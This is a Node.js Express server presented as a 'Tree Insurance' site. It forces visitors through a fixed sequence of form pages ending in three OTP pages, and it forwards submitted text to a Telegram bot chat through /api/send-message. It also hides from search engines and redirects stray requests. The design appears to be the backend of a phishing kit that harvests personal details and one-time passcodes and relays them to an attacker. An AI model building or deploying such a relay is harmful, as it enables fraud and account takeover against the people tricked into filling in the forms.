/**
 * Tree Insurance - Secure Server
 * Complete Server-Side Protection System
 */

const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const crypto = require('crypto');

// ============================================
// Configuration
// ============================================
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const IS_PRODUCTION = process.env.NODE_ENV === 'production';

// ============================================
// Security: Generate Strong Session Secret
// ============================================
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');

// ============================================
// Security: Session Configuration
// ============================================
const session = require('express-session');
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: IS_PRODUCTION,
    httpOnly: true,
    maxAge: 30 * 60 * 1000, // 30 minutes
    sameSite: 'strict'
  }
}));

// ============================================
// Security: Helmet Headers
// ============================================
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  next();
});

// ============================================
// Middleware
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', 1);

// ============================================
// Telegram Configuration
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('[CONFIG] Missing Telegram credentials in environment.');
}

// ============================================
// Step Sequence Definition
// ============================================
const STEPS = {
  INDEX: 'index',
  INDEX_COMPLETED: 'index_completed',
  FORM1: 'form1',
  FORM1_COMPLETED: 'form1_completed',
  TOTALSELECT: 'totalselect',
  OTP: 'otp'
};

const STEP_SEQUENCE = [STEPS.INDEX, STEPS.INDEX_COMPLETED, STEPS.FORM1, STEPS.FORM1_COMPLETED, STEPS.TOTALSELECT, STEPS.OTP];

// Page to Step Mapping
const PAGE_TO_STEP = {
  '/': STEPS.INDEX,
  '/index.html': STEPS.INDEX,
  '/form1': STEPS.FORM1,
  '/form1.html': STEPS.FORM1,
  '/totalselect': STEPS.TOTALSELECT,
  '/totalselect.html': STEPS.TOTALSELECT,
  '/otp': STEPS.OTP,
  '/otp.html': STEPS.OTP,
  '/otp2': STEPS.OTP,
  '/otp2.html': STEPS.OTP,
  '/otp3': STEPS.OTP,
  '/otp3.html': STEPS.OTP
};

// ============================================
// Step Sequence Middleware (enforceStepSequence)
// ============================================
const enforceStepSequence = (req, res, next) => {
  const requestedPath = req.path;
  const requestedStep = PAGE_TO_STEP[requestedPath] || PAGE_TO_STEP[requestedPath + '.html'] || PAGE_TO_STEP['/' + requestedPath];
  
  // Initialize session if not exists
  if (!req.session.currentStep) {
    req.session.currentStep = STEPS.INDEX;
    req.session.stepHistory = [];
    req.session.createdAt = Date.now();
    req.session.lastActivity = Date.now();
    console.log('[SESSION] New session initialized');
  }
  
  // Update last activity
  req.session.lastActivity = Date.now();
  
  // If requesting a page
  if (requestedStep) {
    const currentStepIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
    const requestedStepIndex = STEP_SEQUENCE.indexOf(requestedStep);
    
    // Log the access
    console.log('[ROUTE] Path: ' + requestedPath + ', Current: ' + req.session.currentStep + ', Requested: ' + requestedStep);
    
    // Allow if:
    // 1. Current step is the same as requested (revisiting)
    // 2. Current step is one step before requested (sequential access)
    // 3. Current step is already completed (going back is allowed)
    
    if (currentStepIndex === -1 || requestedStepIndex === -1) {
      console.warn('[SECURITY] Unknown step - redirecting to index');
      return res.redirect('/');
    }
    
    // Strict sequential access - can only go to current step or next step
    const isCurrentOrNext = requestedStepIndex <= currentStepIndex + 1;
    const isBackwards = requestedStepIndex < currentStepIndex;
    
    if (isCurrentOrNext || isBackwards) {
      // Valid access - add to history if new step
      if (requestedStepIndex > currentStepIndex) {
        req.session.stepHistory.push(req.session.currentStep);
        req.session.currentStep = requestedStep;
        console.log('[STEP] Advanced to: ' + requestedStep);
      }
      return next();
    } else {
      // Attempt to skip steps - block and redirect
      console.warn('[SECURITY] Step bypass attempt from ' + req.session.currentStep + ' to ' + requestedStep + ' IP: ' + req.ip);
      return res.redirect('/');
    }
  }
  
  next();
};

// ============================================
// API: Complete Step
// ============================================
app.post('/api/complete-step', (req, res) => {
  const { step } = req.body;
  
  if (!req.session.currentStep) {
    req.session.currentStep = STEPS.INDEX;
    req.session.stepHistory = [];
  }
  
  let newStep = null;
  let redirectTo = '/';
  
  switch(step) {
    case 'STEP1':
      newStep = STEPS.FORM1;
      redirectTo = '/form1';
      break;
    case 'STEP2':
      newStep = STEPS.TOTALSELECT;
      redirectTo = '/totalselect';
      break;
    case 'OTP':
      newStep = STEPS.OTP;
      redirectTo = '/otp';
      break;
    default:
      return res.status(400).json({ success: false, error: 'Invalid step' });
  }
  
  const currentIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
  const newStepIndex = STEP_SEQUENCE.indexOf(newStep);
  
  if (newStepIndex <= currentIndex + 1) {
    req.session.stepHistory.push(req.session.currentStep);
    req.session.currentStep = newStep;
    req.session.lastActivity = Date.now();
    
    console.log('[SESSION] Step completed. New step: ' + newStep);
    
    res.json({ 
      success: true, 
      redirectTo: redirectTo,
      currentStep: newStep 
    });
  } else {
    console.warn('[SECURITY] Invalid step progression attempt');
    res.status(403).json({ success: false, error: 'Invalid step progression' });
  }
});

// ============================================
// API: Get Session Status
// ============================================
app.get('/api/session-status', (req, res) => {
  res.json({
    currentStep: req.session.currentStep || 'none',
    stepHistory: req.session.stepHistory || [],
    lastActivity: req.session.lastActivity,
    isValid: !!req.session.currentStep
  });
});

// ============================================
// API: Reset Session
// ============================================
app.post('/api/reset-session', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ success: false, error: 'Failed to reset session' });
    }
    res.json({ success: true });
  });
});

// ============================================
// API: Health Check
// ============================================
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok',
    build: 'SECURE-v1.2.0',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// API: Send Message to Telegram
// ============================================
app.post('/api/send-message', async (req, res) => {
  const { text, parse_mode = 'Markdown' } = req.body;

  if (!text || typeof text !== 'string') {
    return res.status(400).json({ ok: false, error: 'Text is required.' });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ ok: false, error: 'Server is not configured.' });
  }

  try {
    const response = await fetch(
      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: parse_mode
        })
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(502).json({ ok: false, error: data.description || 'Telegram API error' });
    }

    res.json({ ok: true });
  } catch (error) {
    console.error('[TELEGRAM] Error:', error);
    res.status(500).json({ ok: false, error: 'Failed to send message.' });
  }
});

// ============================================
// Static Files (Public Resources Only)
// ============================================
const PUBLIC_DIR = path.join(__dirname, 'public');
const PROTECTED_DIR = path.join(__dirname, 'protected_pages');

// Block all HTML files from static serving
app.use((req, res, next) => {
  const ext = path.extname(req.path).toLowerCase();
  if (ext === '.html') {
    console.warn('[SECURITY] Direct HTML access blocked: ' + req.path);
    return res.redirect('/');
  }
  next();
});

// Serve public files only
app.use(express.static(PUBLIC_DIR, {
  index: false,
  setHeaders: (res, filePath) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Cache-Control', 'no-store, no-cache');
  }
}));

// ============================================
// Protected Routes
// ============================================

// Root - Index Page
app.get('/', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
});

app.get('/index.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
});

// Form1 Page - Requires INDEX_COMPLETED
app.get('/form1', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
});

app.get('/form1.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
});

// Totalselect Page - Requires FORM1_COMPLETED
app.get('/totalselect', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
});

app.get('/totalselect.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
});

// OTP Pages - Requires FORM1_COMPLETED
app.get('/otp', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
});

app.get('/otp.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
});

app.get('/otp2', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
});

app.get('/otp2.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
});

app.get('/otp3', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
});

app.get('/otp3.html', enforceStepSequence, (req, res) => {
  res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
});

// ============================================
// Catch-all: Block All Other HTML Access
// ============================================
app.get('*.html', (req, res) => {
  console.warn('[SECURITY] Blocked HTML access: ' + req.path);
  res.redirect('/');
});

// ============================================
// 404 Handler
// ============================================
app.use((req, res) => {
  res.redirect('/');
});

// ============================================
// Server Start
// ============================================
app.listen(PORT, () => {
  console.log('============================================================');
  console.log('  Tree Insurance - SECURE SERVER v1.2.0');
  console.log('============================================================');
  console.log('  Build Date: ' + new Date().toISOString());
  console.log('  Port: ' + PORT);
  console.log('  Environment: ' + (IS_PRODUCTION ? 'PRODUCTION' : 'DEVELOPMENT'));
  console.log('------------------------------------------------------------');
  console.log('  SECURITY FEATURES:');
  console.log('  - Session Secret: ' + (SESSION_SECRET.substring(0, 8) + '...'));
  console.log('  - Cookie Security: httpOnly, sameSite=strict');
  console.log('  - Sequential Step Enforcement: ENABLED');
  console.log('  - Direct HTML Access: BLOCKED');
  console.log('  - Helmet Headers: ENABLED');
  console.log('------------------------------------------------------------');
  console.log('  STEP SEQUENCE:');
  console.log('  1. / (index)');
  console.log('  2. /form1 (requires index completed)');
  console.log('  3. /totalselect (requires form1 completed)');
  console.log('  4. /otp/* (requires totalselect completed)');
  console.log('============================================================');
});
